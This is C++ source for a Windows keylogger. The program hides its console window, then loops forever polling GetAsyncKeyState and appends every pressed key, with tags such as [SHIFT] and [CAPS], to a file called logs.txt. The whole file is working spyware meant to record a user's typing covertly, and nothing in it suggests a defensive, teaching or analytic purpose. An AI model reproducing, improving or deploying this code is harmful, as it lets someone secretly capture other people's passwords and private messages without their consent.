#include <fstream>
#include <Windows.h>
#include <unistd.h>
#include <iostream>

int main() {
    // hide the window
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); 
    
    // Run infinitely
	std::fstream file;
    while(true) {
		for (int key = 8; key <= 190; key++)
		{    
            // https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
            if (GetAsyncKeyState(key) == -32767) {
                file.open("logs.txt", std::fstream::app);
                if (key == VK_SHIFT) {
                    file << "[SHIFT]";
                } else if (key == VK_CAPITAL) {
                    file << "[CAPS]";
                } else if (key == VK_SPACE) {
                    file << "[SPACE]";
                } else if (key == VK_TAB) {
                    file << "[TAB]";
                } else if (key == VK_OEM_PERIOD) {
                    file << ".";
                } else if (key == VK_OEM_4) {
                    file << "[";
                }  else if (key == VK_OEM_6) {
                    file << "]";
                } else if (key == VK_OEM_PLUS) {
                    file << "+";
                } else if (key == VK_OEM_MINUS) {
                    file << "-";
                } else {
                    file << char(key);
                }
                file.close();
            }
        }
    }
}